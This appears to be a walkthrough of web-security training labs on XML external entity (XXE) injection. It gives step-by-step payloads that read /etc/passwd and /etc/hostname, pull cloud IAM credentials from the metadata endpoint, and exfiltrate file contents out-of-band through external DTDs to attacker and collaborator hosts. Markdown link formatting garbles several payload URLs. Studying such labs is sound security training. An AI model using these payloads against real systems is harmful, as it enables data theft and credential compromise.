<img src="images/image1.png" alt="third" width="500">

**Step1:**

Click on view product and then check stock

**Step2:**

Send the POST /product/stock to repeater

<img src="images/image2.png" alt="third" width="500">

**Step3**

add the following payload

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[file:///etc/passwd](file://etc/passwd)"> ]>

<stockCheck>
  <productId>&xxe;
  </productId>
</stockCheck>
```

<img src="images/image3.png" alt="third" width="500">


And the lab is solved.

<img src="images/image4.png" alt="third" width="500">

**Step1:**

Click on view product and then check stock

**Step2:**

Send the POST /product/stock to repeater

<img src="images/image5.png" alt="third" width="500">

**Step3:**

Add this payload
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://internal.vulnerable-website.com/](http://internal.vulnerable-website.com/)"> ]>
```

And call it using `&xxe;`

<img src="images/image6.png" alt="third" width="500">

So we append latest to URL

New payload
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://internal.vulnerable-website.com/latest](http://internal.vulnerable-website.com/latest)"> ]>
```


Now response

<img src="images/image7.png" alt="third" width="500">

We do this until we get admin page

New payload

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://internal.vulnerable-website.com/latest/meta-data](http://internal.vulnerable-website.com/latest/meta-data)"> ]>
```

Finally we found admin endpoint

<img src="images/image8.png" alt="third" width="500">

Final payload

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin](http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)"> ]>
```

We have response

<img src="images/image9.png" alt="third" width="500">

And lab get solve.

<img src="images/image10.png" alt="third" width="500">

**Step1:**

Click on view product and then check stock

**Step2:**

Send the POST /product/stock to repeater

<img src="images/image11.png" alt="third" width="500">

Send the request to repeater

**Step3:**

Change product id parameter to

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

<img src="images/image12.png" alt="third" width="500">

<img src="images/image13.png" alt="third" width="500">

**Step1:**

Go to lab and click on view post

**Step2:**

In comment add a comment and upload file

<img src="images/image14.png" alt="third" width="500"> 

**Step3:**

Send the  POST /post/comment request to repeater

<img src="images/image15.png" alt="third" width="500">

**Step4:**

Remove all content and add

```
<?xml version="1.0" standalone="yes"?>

<!DOCTYPE svg [

  <!ENTITY xxe SYSTEM "[file:///etc/hostname](file://etc/hostname)">

]>

<svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="73.03mm" height="73.03mm">

  <text x="10" y="20">&xxe;</text>

</svg>

```

<img src="images/image16.png" alt="third" width="500">

Now we go to comment page and refresh it

<img src="images/image17.png" alt="third" width="500">

Open image in new tab and we have answer

<img src="images/image18.png" alt="third" width="500">

Alternative payload

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "[file:///etc/hostname](file://etc/hostname)" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
<img src="images/image19.png" alt="third" width="500">

Step1

Click on view product and then check stock

Step2:

Send the POST /product/stock request to repeater

<img src="images/image20.png" alt="third" width="500">

Step3:

Now we use payload
```
<!DOCTYPE foo [

  <!ENTITY % xxe SYSTEM "[https://collaborator id](https://collaborator%20id)">

  %xxe;

]>

<foo>

  <!-- Your XML content here -->

</foo>
```

This is made on the basis of

First, the declaration of an XML parameter entity includes the percent character before the entity name:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

`%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "[http://f2g9j7hhkax.web-attacker.com](http://f2g9j7hhkax.web-attacker.com)"> %xxe; ]>
```
Now go to collaborator and copy collaborator id

Here is the final payload

```
<!DOCTYPE foo [

  <!ENTITY % xxe SYSTEM "[http://u2xvvot8rfkoa6wie0i49s4j0a61urig.oastify.com](http://u2xvvot8rfkoa6wie0i49s4j0a61urig.oastify.com)">

  %xxe;

]>

<foo>

 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

</foo>
```
<img src="images/image21.png" alt="third" width="500">

And we have interaction shown in collaborator

<img src="images/image22.png" alt="third" width="500">

<img src="images/image23.png" alt="third" width="500">

**Step1:**

Click on view detail and then click on view stock.

**Step2:**

Send the POST /product/stock request to repeater

<img src="images/image24.png" alt="third" width="500">

**Step3:**

And this DOC type
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://f2g9j7hhkax.web-attacker.com](http://f2g9j7hhkax.web-attacker.com)"> ]>
```

Adding collaborator id
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://9ku1w9odyxg62dwqsjgfbrekdbj27svh.oastify.com](http://9ku1w9odyxg62dwqsjgfbrekdbj27svh.oastify.com)"> ]>
```

And call using `&xxe;`

Send the request

<img src="images/image25.png" alt="third" width="500">

We have interaction in collaborator

<img src="images/image26.png" alt="third" width="500">

<img src="images/image27.png" alt="third" width="500">

**Step1:**

Go to exploit server and make file /exploit.dtd

In this file add payload
```
<!ENTITY % file SYSTEM "[file:///etc/passwd](file://etc/passwd)"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '[http://web-attacker.com/?x=%file;](http://web-attacker.com/?x=%25file;)'>"> %eval; %exfiltrate;
```

Instead of [http://web-attacker.com](http://web-attacker.com) use burp collaborator id

```
<!ENTITY % file SYSTEM "[file:///etc/hostname](file://etc/hostname)"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '[http://ua8mmueyoi6rsymbi4601c453w9nxil7.oastify.com/?x=%file;](http://ua8mmueyoi6rsymbi4601c453w9nxil7.oastify.com/?x=%25file;)'>"> %eval; %exfiltrate;
```

We have

<img src="images/image28.png" alt="third" width="500">

View exploit ad make note of URL

[https://exploit-0a9a00fc04dbbcfd81a3f20b011a00e7.exploit-server.net/exploit.dtd](https://exploit-0a9a00fc04dbbcfd81a3f20b011a00e7.exploit-server.net/exploit.dtd)

Now store it

**Step2:**

Click on view detail and then check stock

Send the POST /product/stock to repeater

In stock xml add a doc type
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "

[https://exploit-0a9a00fc04dbbcfd81a3f20b011a00e7.exploit-server.net/exploit.dtd](https://exploit-0a9a00fc04dbbcfd81a3f20b011a00e7.exploit-server.net/exploit.dtd)

"> %xxe;]>
```
<img src="images/image29.png" alt="third" width="500">

We have hostname in collaborator interaction

<img src="images/image30.png" alt="third" width="500">

<img src="images/image31.png" alt="third" width="500">

**Step1:**

Go to view product and click on view product then check stock.

**Step2:**

Send the request to repeater

<img src="images/image32.png" alt="third" width="500">

**Step3:**

Go to exploit server create file exploit.dtd and save payload
```
<!ENTITY % file SYSTEM "[file:///etc/passwd](file://etc/passwd)">

<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '[file:///nonexistent/%file;](file://nonexistent/%25file;)'>">

%eval;

%error;
```

Click on view exploit and copy the url

[https://exploit-0a14003b04f959c480b4e9f3010500c0.exploit-server.net/exploit.dtd](https://exploit-0a14003b04f959c480b4e9f3010500c0.exploit-server.net/exploit.dtd)

**Step4:**

Add the following payload in POST /product/stock request

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "[http://web-attacker.com/malicious.dtd](http://web-attacker.com/malicious.dtd)"> %xxe;]>
```

In my case it look like
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"[https://exploit-0a14003b04f959c480b4e9f3010500c0.exploit-server.net/exploit.dtd](https://exploit-0a14003b04f959c480b4e9f3010500c0.exploit-server.net/exploit.dtd)"> %xxe;]>

```

<img src="images/image33.png" alt="third" width="500">

And the lab is solved

<img src="images/image35.png" alt="third" width="500">

**Step1**

Use this payload to solve this lab

```
<!DOCTYPE foo [

<!ENTITY % local_dtd SYSTEM "[file:///usr/share/yelp/dtd/docbookx.dtd](file://usr/share/yelp/dtd/docbookx.dtd)">

<!ENTITY % ISOamso '

<!ENTITY &#x25; file SYSTEM "[file:///etc/passwd](file://etc/passwd)">

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

&#x25;eval;

&#x25;error;

'>

%local_dtd;

]>
```
<img src="images/image34.png" alt="third" width="500">```
